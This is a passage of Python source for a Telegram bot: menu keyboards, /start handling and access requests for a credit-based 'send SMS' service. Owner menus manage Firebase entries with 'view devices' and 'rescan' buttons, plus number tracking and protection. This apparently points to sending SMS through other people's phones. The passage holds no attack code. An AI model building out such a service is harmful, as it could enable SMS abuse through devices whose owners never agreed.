        [btn("sᴇɴᴅ sᴍs", "owner:send", EMOJI_ROCKET, "📤"),
         btn("ᴍᴀɴᴀɢᴇ ғɪʀᴇʙᴀsᴇ", "owner:fb:menu:0", EMOJI_FIRE, "🔥")],
        [btn("ᴍᴀɴᴀɢᴇ ᴍᴇᴅɪᴀ", "owner:videos:menu", EMOJI_VIDEO, "📹"),
         btn("ᴍᴀɴᴀɢᴇ sᴜᴘᴇʀ ᴀᴅᴍɪɴs", "owner:owners:menu", EMOJI_CROWN, "👑")],
        [btn("ᴍᴀɴᴀɢᴇ ᴀᴅᴍɪɴs", "owner:admins:menu", EMOJI_SHIELD, "🛡"),
         btn("ᴠɪᴇᴡ ᴜsᴇʀs", "owner:users:list", EMOJI_STAR, "👥")],
        [btn("ʙᴀɴ ᴜsᴇʀ", "owner:ban", EMOJI_CROSS, "🚫"),
         btn("ᴜɴʙᴀɴ ᴜsᴇʀ", "owner:unban:menu", EMOJI_CHECK, "✅")],
        [btn("ʙʀᴏᴀᴅᴄᴀsᴛ", "owner:broadcast", EMOJI_BELL, "📢"),
         btn("ᴀᴘɪ sᴛᴀᴛs", "owner:stats", EMOJI_STAR, "📊")],
        [btn("ᴀᴄᴛɪᴠɪᴛɪ ʟᴏɢ", "owner:activity", EMOJI_GEAR, "📜"),
         btn("ᴘʀɪᴄɪɴɢ ᴘʟᴀɴs", "owner:pricing:menu", EMOJI_MONEY, "💳")],
        [btn("ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇs", "owner:redeem:menu", EMOJI_GIFT, "🎁"),
         btn("ᴀᴅᴅ ᴄʀᴇᴅɪᴛs", "owner:credits:add", EMOJI_MONEY, "💰")],
        [btn("ᴅᴇᴅᴜᴄᴛ ᴄʀᴇᴅɪᴛs", "owner:credits:deduct", EMOJI_CROSS, "💰"),
         btn("ᴀᴅᴅ ᴄʀᴇᴅɪᴛs ᴀʟʟ", "owner:add_all_credits", EMOJI_MONEY, "💰")],
        [btn("ᴅᴇᴅᴜᴄᴛ ᴀʟʟ", "owner:deduct_all_credits", EMOJI_CROSS, "💰"),
         btn("ғᴏʀᴄᴇ ᴊᴏɪɴ", "owner:fj:menu", EMOJI_BELL, "🔗")],
        [btn("sᴇᴛᴛɪɴɢs", "owner:settings", EMOJI_GEAR, "⚙️"),
         btn("sᴍs ʜɪsᴛᴏʀʏ", "owner:sms_history", EMOJI_STAR, "📋")],
        [btn("ᴇxᴘᴏʀᴛ sᴄʀɪᴘᴛ", "owner:export_script", EMOJI_GEAR, "📤"),
         btn("ᴘʀᴏᴛᴇᴄᴛ ɴᴜᴍʙᴇʀ", "owner:protect", EMOJI_LOCK, "🔒")],
        [btn("ᴘʀᴏᴛᴇᴄᴛᴇᴅ ʟɪsᴛ", "owner:protected_list", EMOJI_LOCK, "🔐"),
         btn("ᴛʀᴀᴄᴋ ɴᴜᴍʙᴇʀ", "owner:track", EMOJI_STAR, "📊")],
        [InlineKeyboardButton(text=mode_btn[0], callback_data=mode_btn[1])],
        [btn("ʀᴇғʀᴇsʜ", "owner:refresh", EMOJI_GEAR, "🔄")],
    ])

def owner_home_kb_v2(d: dict) -> InlineKeyboardMarkup:
    mode_btn = ("🔴 ᴅɪsᴀʙʟᴇ ғʀᴇᴇ", "owner:free:off") if d.get("free_mode") \
               else ("🟢 ᴇɴᴀʙʟᴇ ғʀᴇᴇ", "owner:free:on")
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("👥 ᴜsᴇʀs", "owner:cat:users", EMOJI_STAR, "👥", style="primary"),
         btn("📹 ᴄᴏɴᴛᴇɴᴛ", "owner:cat:content", EMOJI_VIDEO, "📹", style="primary")],
        [btn("💰 ᴄʀᴇᴅɪᴛs", "owner:cat:credits", EMOJI_MONEY, "💰", style="success"),
         btn("⚙️ sʏsᴛᴇᴍ", "owner:cat:system", EMOJI_GEAR, "⚙️")],
        [btn("📤 sᴇɴᴅ sᴍs", "owner:send", EMOJI_ROCKET, "📤", style="success"),
         btn("🔥 ғɪʀᴇʙᴀsᴇ", "owner:fb:menu:0", EMOJI_FIRE, "🔥", style="danger")],
        [InlineKeyboardButton(text=mode_btn[0], callback_data=mode_btn[1])],
        [btn("ʀᴇғʀᴇsʜ", "owner:refresh", EMOJI_GEAR, "🔄")],
    ])

def owner_cat_kb(cat: str) -> InlineKeyboardMarkup:
    if cat == "users":
        return InlineKeyboardMarkup(inline_keyboard=[
            [btn("ᴠɪᴇᴡ ᴜsᴇʀs", "owner:users:list", EMOJI_STAR, "👥", style="primary"),
             btn("🔍 ғɪɴᴅ", "owner:users:search", EMOJI_GEAR, "🔍", style="primary")],
            [btn("ʙᴀɴ ᴜsᴇʀ", "owner:ban", EMOJI_CROSS, "🚫", style="danger"),
             btn("ᴜɴʙᴀɴ", "owner:unban:menu", EMOJI_CHECK, "✅", style="success")],
            [btn("ᴍᴀɴᴀɢᴇ sᴜᴘᴇʀ ᴀᴅᴍɪɴs", "owner:owners:menu", EMOJI_CROWN, "👑", style="primary"),
             btn("ᴍᴀɴᴀɢᴇ ᴀᴅᴍɪɴs", "owner:admins:menu", EMOJI_SHIELD, "🛡", style="primary")],
            [btn("📢 ʙʀᴏᴀᴅᴄᴀsᴛ", "owner:broadcast", EMOJI_BELL, "📢", style="primary")],
            [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")],
        ])
    elif cat == "content":
        return InlineKeyboardMarkup(inline_keyboard=[
            [btn("ᴍᴀɴᴀɢᴇ ᴍᴇᴅɪᴀ", "owner:videos:menu", EMOJI_VIDEO, "📹", style="primary")],
            [btn("📢 ʙʀᴏᴀᴅᴄᴀsᴛ ʙᴜɪʟᴅᴇʀ", "owner:bcast_builder", EMOJI_BELL, "📢", style="primary")],
            [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")],
        ])
    elif cat == "credits":
        return InlineKeyboardMarkup(inline_keyboard=[
            [btn("➕ ᴀᴅᴅ ᴄʀᴇᴅɪᴛs", "owner:credits:add", EMOJI_MONEY, "➕", style="success"),
             btn("➖ ᴅᴇᴅᴜᴄᴛ", "owner:credits:deduct", EMOJI_CROSS, "➖", style="danger")],
            [btn("💰 ᴀᴅᴅ ᴛᴏ ᴀʟʟ", "owner:add_all_credits", EMOJI_MONEY, "💰", style="success"),
             btn("💸 ᴅᴇᴅᴜᴄᴛ ғʀᴏᴍ ᴀʟʟ", "owner:deduct_all_credits", EMOJI_CROSS, "💸", style="danger")],
            [btn("🎁 ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇs", "owner:redeem:menu", EMOJI_GIFT, "🎁", style="primary"),
             btn("💳 ᴘʀɪᴄɪɴɢ ᴘʟᴀɴs", "owner:pricing:menu", EMOJI_MONEY, "💳", style="primary")],
            [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")],
        ])
    else:
        return InlineKeyboardMarkup(inline_keyboard=[
            [btn("📊 ᴍᴏɴɪᴛᴏʀɪɴɢ", "owner:monitoring", EMOJI_STAR, "📊", style="success"),
             btn("💾 ᴀᴜᴛᴏ ʙᴀᴄᴋᴜᴘ", "owner:backup:menu", EMOJI_BELL, "💾", style="success")],
            [btn("📊 ᴀᴘɪ sᴛᴀᴛs", "owner:stats", EMOJI_STAR, "📊", style="primary"),
             btn("📜 ᴀᴄᴛɪᴠɪᴛʏ", "owner:activity", EMOJI_GEAR, "📜", style="primary")],
            [btn("🔗 ғᴏʀᴄᴇ ᴊᴏɪɴ", "owner:fj:menu", EMOJI_BELL, "🔗", style="primary"),
             btn("⚙️ sᴇᴛᴛɪɴɢs", "owner:settings", EMOJI_GEAR, "⚙️", style="primary")],
            [btn("🔒 ᴘʀᴏᴛᴇᴄᴛ ɴᴜᴍʙᴇʀ", "owner:protect", EMOJI_LOCK, "🔒", style="primary"),
             btn("🔐 ᴘʀᴏᴛᴇᴄᴛᴇᴅ ʟɪsᴛ", "owner:protected_list", EMOJI_LOCK, "🔐", style="primary")],
            [btn("📊 ᴛʀᴀᴄᴋ ɴᴜᴍʙᴇʀ", "owner:track", EMOJI_STAR, "📊", style="primary"),
             btn("📋 sᴍs ʜɪsᴛᴏʀʏ", "owner:sms_history", EMOJI_STAR, "📋", style="primary")],
            [btn("📤 ᴇxᴘᴏʀᴛ sᴄʀɪᴘᴛ", "owner:export_script", EMOJI_GEAR, "📤", style="primary")],
            [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")],
        ])

def admin_kb(d: dict) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "admin:send", EMOJI_ROCKET, "📤", style="success"),
         btn("ᴍᴀɴᴀɢᴇ ᴍᴇᴅɪᴀ", "owner:videos:menu", EMOJI_VIDEO, "📹", style="primary")],
        [btn("ᴠɪᴇᴡ ᴜsᴇʀs", "admin:users:list", EMOJI_STAR, "👥", style="primary"),
         btn("ᴀᴘɪ sᴛᴀᴛs", "admin:stats", EMOJI_STAR, "📊", style="primary")],
        [btn("ʙᴀɴ ᴜsᴇʀ", "admin:ban", EMOJI_CROSS, "🚫", style="danger"),
         btn("ᴜɴʙᴀɴ ᴜsᴇʀ", "admin:unban:menu", EMOJI_CHECK, "✅", style="success")],
        [btn("ʙʀᴏᴀᴅᴄᴀsᴛ", "admin:broadcast", EMOJI_BELL, "📢", style="primary")],
        [btn("ʀᴇғʀᴇsʜ", "admin:refresh", EMOJI_GEAR, "🔄", style="primary")],
    ])

def admin_home_kb_v2(d: dict) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("📤 sᴇɴᴅ sᴍs", "admin:send", EMOJI_ROCKET, "📤", style="success"),
         btn("📊 ᴀᴘɪ sᴛᴀᴛs", "admin:stats", EMOJI_STAR, "📊", style="primary")],
        [btn("👥 ᴠɪᴇᴡ ᴜsᴇʀs", "admin:users:list", EMOJI_STAR, "👥", style="primary"),
         btn("🔍 ғɪɴᴅ ᴜsᴇʀ", "admin:users:search", EMOJI_GEAR, "🔍", style="primary")],
        [btn("🚫 ʙᴀɴ", "admin:ban", EMOJI_CROSS, "🚫", style="danger"),
         btn("✅ ᴜɴʙᴀɴ", "admin:unban:menu", EMOJI_CHECK, "✅", style="success")],
        [btn("📹 ᴍᴀɴᴀɢᴇ ᴍᴇᴅɪᴀ", "owner:videos:menu", EMOJI_VIDEO, "📹", style="primary"),
         btn("📢 ʙʀᴏᴀᴅᴄᴀsᴛ", "admin:broadcast", EMOJI_BELL, "📢", style="primary")],
        [btn("ʀᴇғʀᴇsʜ", "admin:refresh", EMOJI_GEAR, "🔄", style="primary")],
    ])

def user_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "user:send", "6203911118964924015", "📤", style="success")],
        [btn("ᴄʀᴇᴅɪᴛs", "user:credits", "5326049357332513437", "💳", style="primary")],
        [btn("ʀᴇᴅᴇᴇᴍ", "user:redeem", "6197500339109763704", "🎁", style="primary"),
         btn("ʀᴇғᴇʀ", "user:refer", EMOJI_STAR, "👥", style="primary")],
        [btn("sᴛᴀᴛs", "user:stats", "6104690120227559861", "📊", style="primary"),
         btn("ᴍʏ sᴍs ʜɪsᴛᴏʀʏ", "user:sms_history", "5231264265242954153", "📜", style="primary")],
        [btn("ʙᴜʏ ᴄʀᴇᴅɪᴛs", "user:pricing", "6120628756747919945", "💰", style="success")],
        [btn("ᴛʀᴀɴsғᴇʀ ᴄʀᴇᴅɪᴛs", "user:transfer", "6120713655366455614", "💸", style="primary")],
        [btn("ɪɴғᴏ", "user:info", "5359454053887670307", "ℹ️", style="primary")],
    ])

def videos_menu_kb(d: dict) -> InlineKeyboardMarkup:
    videos = d.get("videos", [])
    wv = get_welcome_video(d)
    rows = []
    if wv:
        icon = "🖼" if wv.get("type") == "photo" else "📹"
        sp = " 🙈" if wv.get("spoiler") else ""
        rows.append([btn(f"{icon} ᴡᴇʟᴄᴏᴍᴇ ᴠɪᴅᴇᴏ{sp}", "owner:videos:welcome:view",
                         EMOJI_VIDEO, icon, style="primary")])
        rows.append([
            btn("🔄 ʀᴇᴘʟᴀᴄᴇ", "owner:videos:welcome:add", EMOJI_GEAR, "🔄", style="primary"),
            btn("🗑 ʀᴇᴍᴏᴠᴇ", "owner:videos:welcome:del", EMOJI_CROSS, "🗑", style="danger"),
        ])
    else:
        rows.append([btn("➕ ᴀᴅᴅ ᴡᴇʟᴄᴏᴍᴇ ᴠɪᴅᴇᴏ", "owner:videos:welcome:add",
                         EMOJI_CHECK, "➕", style="success")])
    rows.append([btn("➕ ᴀᴅᴅ ᴛᴏ ʀᴏᴛᴀᴛɪᴏɴ", "owner:videos:add", EMOJI_CHECK, "➕", style="success")])
    for i, item in enumerate(videos, 1):
        if isinstance(item, dict):
            mt = item.get("type", "video"); sp = item.get("spoiler", False)
        else:
            mt, sp = "video", False
        icon = "🖼" if mt == "photo" else "📹"
        tag = " 🙈" if sp else ""
        rows.append([
            btn(f"{icon} #{i}{tag}", "noop", EMOJI_VIDEO, icon),
            btn("ʀᴇᴍᴏᴠᴇ", f"owner:videos:del:{i-1}", EMOJI_CROSS, "🗑", style="danger"),
        ])
    if videos:
        rows.append([btn("🗑 ʙᴜʟᴋ ᴅᴇʟᴇᴛᴇ", "owner:videos:bulk_del", EMOJI_CROSS, "🗑", style="danger")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:cat:content", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def fb_menu_kb(d: dict, page: int = 0) -> InlineKeyboardMarkup:
    fbs = d.get("firebases", [])
    per = 8
    total = max(1, (len(fbs) + per - 1) // per)
    page = max(0, min(page, total - 1))
    start = page * per
    cur = fbs[start:start+per]
    rows = [
        [btn("ᴀᴅᴅ ғɪʀᴇʙᴀsᴇ", "owner:fb:add", EMOJI_CHECK, "➕", style="success"),
         btn("📁 ᴀᴅᴅ ᴠɪᴀ ᴛxᴛ", "owner:fb:add_file", EMOJI_CHECK, "📄", style="success")],
    ]
    for fb in cur:
        label = fb.get("label", fb["url"].replace("https://", ""))[:16]
        rows.append([
            btn(label, f"owner:fb:view:{fb['id']}", EMOJI_FIRE, "🔥", style="primary"),
            btn("ʀᴇᴍᴏᴠᴇ", f"owner:fb:del:{fb['id']}:{page}", EMOJI_CROSS, "🗑", style="danger"),
        ])
    nav = []
    if page > 0: nav.append(btn("◀️ ᴘʀᴇᴠ", f"owner:fb:menu:{page-1}", EMOJI_GEAR, "◀️", style="primary"))
    if page < total - 1: nav.append(btn("ɴᴇxᴛ ▶️", f"owner:fb:menu:{page+1}", EMOJI_GEAR, "▶️", style="primary"))
    if nav: rows.append(nav)
    rows.append([btn("ʙᴀᴄᴋ", "owner:cat:system", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def fb_detail_kb(fb_id: str, back_page: int = 0) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("ᴛᴇsᴛ", f"fb:test:{fb_id}", EMOJI_CHECK, "🔌", style="success"),
         btn("🔄 ʀᴇsᴄᴀɴ", f"fb:rescan:{fb_id}", EMOJI_GEAR, "🔄", style="primary")],
        [btn("ᴠɪᴇᴡ ᴅᴇᴠɪᴄᴇs", f"fb:devs:{fb_id}", EMOJI_PHONE, "📱", style="primary")],
        [btn("🗑 ʀᴇᴍᴏᴠᴇ", f"fb:del_confirm:{fb_id}:{back_page}", EMOJI_CROSS, "🗑", style="danger")],
        [btn("ʙᴀᴄᴋ", f"owner:fb:menu:{back_page}", EMOJI_GEAR, "🔙")],
    ])

def owners_menu_kb(d: dict) -> InlineKeyboardMarkup:
    owners = d.get("owners", [])
    rows = []
    if len(owners) < 6:
        rows.append([btn("ᴀᴅᴅ sᴜᴘᴇʀ ᴀᴅᴍɪɴ", "owner:owners:add", EMOJI_CHECK, "➕", style="success")])
    for oid in owners:
        if oid == MAIN_OWNER:
            rows.append([btn(f"{oid} (ᴍᴀɪɴ)", "noop", EMOJI_CROWN, "👑")])
        else:
            rows.append([
                btn(f"{oid}", "noop", EMOJI_CROWN, "🔱"),
                btn("ʀᴇᴍᴏᴠᴇ", f"owner:owners:del:{oid}", EMOJI_CROSS, "🗑", style="danger"),
            ])
    rows.append([btn("ʙᴀᴄᴋ", "owner:cat:users", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def admins_menu_kb(d: dict) -> InlineKeyboardMarkup:
    admins = d.get("admins", [])
    rows = [[btn("ᴀᴅᴅ ᴀᴅᴍɪɴ", "owner:admins:add", EMOJI_CHECK, "➕", style="success")]]
    for aid in admins:
        rows.append([
            btn(f"{aid}", "noop", EMOJI_SHIELD, "🛡"),
            btn("ʀᴇᴍᴏᴠᴇ", f"owner:admins:del:{aid}", EMOJI_CROSS, "🗑", style="danger"),
        ])
    rows.append([btn("ʙᴀᴄᴋ", "owner:cat:users", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def unban_menu_kb(d: dict, prefix: str) -> InlineKeyboardMarkup:
    banned = d.get("banned", [])
    rows = []
    for bid in banned:
        rows.append([btn(f"{bid}", f"{prefix}:unban:do:{bid}", EMOJI_CHECK, "🔓", style="success")])
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def users_list_kb_v2(d: dict, prefix: str, page: int = 0, query: str = "") -> tuple:
    users = d.get("users", {})
    items = list(users.items())
    if query:
        q = query.lower()
        items = [(k, v) for k, v in items if q in k or q in (v.get("name") or "").lower()]
    per = 8
    start = page * per
    chunk = items[start:start+per]
    approved = d.get("approved", [])
    banned = d.get("banned", [])

    header = f"{em(EMOJI_STAR, '👥')} <b>Users</b> ({len(items)}"
    if query: header += f" of {len(users)}"
    header += ")"
    if query: header += f"  ·  🔍 <code>{escape(query)}</code>"
    lines = [header, ""]
    for uid_str, ud in chunk:
        uid = int(uid_str)
        name = escape(ud.get("name", "Unknown"))[:20]
        credits = ud.get("credits", 0)
        if uid in banned: s = "🚫"
        elif uid in approved: s = "✅"
        elif is_owner(uid, d): s = "👑"
        elif uid in d["admins"]: s = "🛡"
        else: s = "👤"
        lines.append(f"{s} <code>{uid}</code>  ·  {name}  ·  💰{credits}")
    text = "\n".join(lines)

    rows = []
    for uid_str, ud in chunk:
        uid = int(uid_str)
        name = escape(ud.get("name", "Unknown"))[:16]
        rows.append([btn(f"{uid} · {name}", f"u:view:{uid}:{prefix}:{page}",
                         EMOJI_STAR, "👤", style="primary")])
    nav = []
    if page > 0:
        nav.append(btn("◀️", f"{prefix}:users:pg:{page-1}:{query or '_'}", EMOJI_GEAR, "◀️", style="primary"))
    nav.append(btn("🔍", f"{prefix}:users:search", EMOJI_GEAR, "🔍", style="primary"))
    if start + per < len(items):
        nav.append(btn("▶️", f"{prefix}:users:pg:{page+1}:{query or '_'}", EMOJI_GEAR, "▶️", style="primary"))
    rows.append(nav)
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙")])
    return text, InlineKeyboardMarkup(inline_keyboard=rows)

def user_detail_kb(uid: int, d: dict, back_cb: str) -> InlineKeyboardMarkup:
    is_b = uid in d.get("banned", [])
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("➕ ᴀᴅᴅ ᴄʀᴇᴅɪᴛs", f"u:cr:add:{uid}", EMOJI_MONEY, "➕", style="success"),
         btn("➖ ᴅᴇᴅᴜᴄᴛ", f"u:cr:sub:{uid}", EMOJI_CROSS, "➖", style="danger")],
        [btn("✅ ᴜɴʙᴀɴ" if is_b else "🚫 ʙᴀɴ",
             f"u:unban:{uid}" if is_b else f"u:ban:{uid}",
             EMOJI_CHECK if is_b else EMOJI_CROSS,
             "✅" if is_b else "🚫",
             style="success" if is_b else "danger")],
        [btn("📋 ғᴜʟʟ ʀᴇᴄᴏʀᴅ", f"u:record:{uid}", EMOJI_STAR, "📋", style="primary")],
        [btn("📜 sᴍs ʜɪsᴛᴏʀʏ", f"u:hist:{uid}", EMOJI_STAR, "📜", style="primary")],
        [btn("ʙᴀᴄᴋ", back_cb, EMOJI_GEAR, "🔙")],
    ])

def user_record_kb(uid: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("📜 ғᴜʟʟ sᴍs", f"u:hist:{uid}", EMOJI_STAR, "📜", style="primary"),
         btn("📊 ᴀᴄᴛɪᴠɪᴛʏ", f"u:activity:{uid}", EMOJI_GEAR, "📊", style="primary")],
        [btn("➕ ᴄʀᴇᴅɪᴛs", f"u:cr:add:{uid}", EMOJI_MONEY, "➕", style="success"),
         btn("➖ ᴅᴇᴅᴜᴄᴛ", f"u:cr:sub:{uid}", EMOJI_CROSS, "➖", style="danger")],
        [btn("ʙᴀᴄᴋ", f"u:view:{uid}:owner:0", EMOJI_GEAR, "🔙")],
    ])

def backup_panel_kb(d: dict) -> InlineKeyboardMarkup:
    cfg = d.get("backup", {})
    enabled = cfg.get("enabled", False)
    rows = [
        [btn("🎯 sᴇᴛ ᴄʜᴀᴛ", "bk:setchat", EMOJI_GEAR, "🎯", style="primary"),
         btn("⏰ sᴇᴛ ᴛɪᴍᴇs", "bk:settimes", EMOJI_GEAR, "⏰", style="primary")],
    ]
    if enabled:
        rows.append([btn("🔴 ᴅɪsᴀʙʟᴇ", "bk:toggle:off", EMOJI_CROSS, "🔴", style="danger")])
    else:
        rows.append([btn("🟢 ᴇɴᴀʙʟᴇ", "bk:toggle:on", EMOJI_CHECK, "🟢", style="success")])
    rows.append([btn("💾 ʙᴀᴄᴋᴜᴘ ɴᴏᴡ", "bk:now", EMOJI_BELL, "💾", style="success")])
    rows.append([btn("📜 ʜɪsᴛᴏʀʏ", "bk:history", EMOJI_STAR, "📜", style="primary")])
    rows.append([btn("📦 ᴄʟᴇᴀɴ ʟᴏᴄᴀʟ", "bk:clean", EMOJI_CROSS, "📦", style="danger")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:cat:system", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def monitoring_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("🔄 ʀᴇғʀᴇsʜ", "mon:refresh", EMOJI_GEAR, "🔄", style="primary")],
        [btn("📈 ᴅᴀᴜ ɢʀᴀᴘʜ", "mon:dau", EMOJI_STAR, "📈", style="success"),
         btn("🏆 ᴛᴏᴘ ᴜsᴇʀs", "mon:top", EMOJI_CROWN, "🏆", style="success")],
        [btn("💾 ʙᴀᴄᴋᴜᴘ", "owner:backup:menu", EMOJI_BELL, "💾", style="primary"),
         btn("📦 sᴛᴏʀᴀɢᴇ", "mon:storage", EMOJI_STAR, "📦", style="primary")],
        [btn("ʙᴀᴄᴋ", "owner:cat:system", EMOJI_GEAR, "🔙")],
    ])

def bcast_preview_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("✅ sᴇɴᴅ", "bcast:go", EMOJI_CHECK, "✅", style="success"),
         btn("🔗 ᴀᴅᴅ ʙᴜᴛᴛᴏɴ", "bcast:addbtn", EMOJI_GEAR, "🔗", style="primary")],
        [btn("✏️ ᴇᴅɪᴛ", "bcast:edit", EMOJI_GEAR, "✏️", style="primary"),
         btn("❌ ᴄᴀɴᴄᴇʟ", "bcast:cancel", EMOJI_CROSS, "❌", style="danger")],
    ])


# ═══════════════════════════════════════════════════════════════════════
# ROUTER + HANDLERS
# ═══════════════════════════════════════════════════════════════════════
R = Router()

# ─── /start ─────────────────────────────────────────────────────
@R.message(CommandStart(deep_link=True))
async def cmd_start_deep(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(send_fire_effect_private(msg.bot, msg.chat.id))
    name = msg.from_user.full_name or "User"
    username = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"

    is_new = atomic_update(lambda d: reg_user(uid, name, d))
    touch_user_activity(uid)

    if is_new:
        await send_channel_log(msg.bot,
            f"🆕 <b>NEW USER JOINED</b>\n\n"
            f"👤 <b>Name:</b> {escape(name)}\n"
            f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
            f"🌐 <b>Username:</b> {escape(username)}\n"
            f"📅 <b>Time:</b> <code>{fmt_time(int(time.time()))}</code>")

    args = msg.text.split()
    code = args[1] if len(args) > 1 else ""
    notice = ""
    if code.startswith("RDM"):
        st, cr = do_redeem_code(uid, code[3:])
        if st == "ok": notice = f"\n\n{em(EMOJI_GIFT, '🎉')} <b>Redeem Successful!</b> +{cr} credits!"
        elif st == "expired": notice = f"\n\n{em(EMOJI_CROSS, '❌')} Ye redeem code expire ho gaya hai!"
        elif st == "used": notice = f"\n\n{em(EMOJI_CROSS, '❌')} Aap pehle se ye code use kar chuke hain!"
        elif st == "invalid": notice = f"\n\n{em(EMOJI_CROSS, '❌')} Invalid redeem code!"
    if code.startswith("REF"):
        d0 = load()
        if not d0["users"].get(str(uid), {}).get("referred_by"):
            success, mtext, ref = process_referral(uid, code, d0)
            if success and ref:
                try:
                    ref_name = d0["users"].get(str(uid), {}).get("name", "Someone")
                    await msg.bot.send_message(ref,
                        f"{em(EMOJI_GIFT, '🎉')} <b>{escape(ref_name)}</b> ne aapka referral code use kiya!\n"
                        f"{em(EMOJI_MONEY, '💰')} +{d0['settings']['ref_credits']} credits mile hain.",
                        parse_mode="HTML")
                except: pass

    d = load()
    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing),
                         parse_mode="HTML", disable_web_page_preview=True)
        return

    if notice:
        await msg.answer(notice.strip(), parse_mode="HTML")

    if is_owner(uid, d):
        await send_media_with_caption(msg.bot, msg.chat.id, d,
                                      owner_panel_text(d), owner_home_kb_v2(d))
        return
    if is_admin(uid, d):
        await send_media_with_caption(msg.bot, msg.chat.id, d,
                                      admin_panel_text(d), admin_home_kb_v2(d))
        return
    if is_banned(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '🚫')} <b>Aapko ban kar diya gaya hai.</b>", parse_mode="HTML")
        return
    if not can_use(uid, d):
        await msg.answer(no_access_text(uid, d),
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [btn("📩 ʀᴇǫᴜᴇsᴛ ᴀᴘᴘʀᴏᴠᴀʟ", "user:req_access", EMOJI_BELL, "📩", style="primary")]
            ]),
            parse_mode="HTML", disable_web_page_preview=True)
        return

    await send_welcome(msg.bot, msg.chat.id, d, uid, is_new)


@R.message(Command("start"))
async def cmd_start(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(send_fire_effect_private(msg.bot, msg.chat.id))
    name = msg.from_user.full_name or "User"
    username = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"

    def _reg(d):
        return reg_user(uid, name, d)
    is_new = atomic_update(_reg)
    touch_user_activity(uid)

    if is_new:
        await send_channel_log(msg.bot,
            f"🆕 <b>NEW USER JOINED</b>\n\n"
            f"👤 <b>Name:</b> {escape(name)}\n"
            f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
            f"🌐 <b>Username:</b> {escape(username)}\n"
            f"📅 <b>Time:</b> <code>{fmt_time(int(time.time()))}</code>")

    d = load()
    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing),
                         parse_mode="HTML", disable_web_page_preview=True)
        return

    if is_owner(uid, d):
        await send_media_with_caption(msg.bot, msg.chat.id, d,
                                      owner_panel_text(d), owner_home_kb_v2(d))
        return
    if is_admin(uid, d):
        await send_media_with_caption(msg.bot, msg.chat.id, d,
                                      admin_panel_text(d), admin_home_kb_v2(d))
        return
    if is_banned(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '🚫')} <b>Aapko ban kar diya gaya hai.</b>", parse_mode="HTML")
        return
    if not can_use(uid, d):
        await msg.answer(no_access_text(uid, d),
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [btn("📩 ʀᴇǫᴜᴇsᴛ ᴀᴘᴘʀᴏᴠᴀʟ", "user:req_access", EMOJI_BELL, "📩", style="primary")]
            ]),
            parse_mode="HTML", disable_web_page_preview=True)
        return

    await send_welcome(msg.bot, msg.chat.id, d, uid, is_new)


@R.callback_query(F.data == "user:req_access")
async def user_req_access(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    name = escape(cq.from_user.full_name or "User")
    uname = f"@{cq.from_user.username}" if cq.from_user.username else "no username"
    try:
        await cq.bot.send_message(MAIN_OWNER,
            f"{em(EMOJI_BELL, '📩')} <b>Access Request</b>\n\n"
            f"{em(EMOJI_STAR, '👤')} name: {name}\n"
            f"{em(EMOJI_GEAR, '🆔')} uid: <code>{uid}</code>\n"
            f"{em(EMOJI_GEAR, '🌐')} uname: {escape(uname)}",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                btn("✅ ᴀᴘᴘʀᴏᴠᴇ", f"owner:approve_user:{uid}", EMOJI_CHECK, "✅", style="success"),
                btn("🚫 ʙᴀɴ", f"owner:ban_user:{uid}", EMOJI_CROSS, "🚫", style="danger"),
            ]]))
        await cq.answer("📩 Request sent", show_alert=True)
    except Exception:
        await cq.answer("❌ Could not reach owner", show_alert=True)


@R.callback_query(F.data.startswith("owner:approve_user:"))
async def owner_approve_user(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫", show_alert=True); return
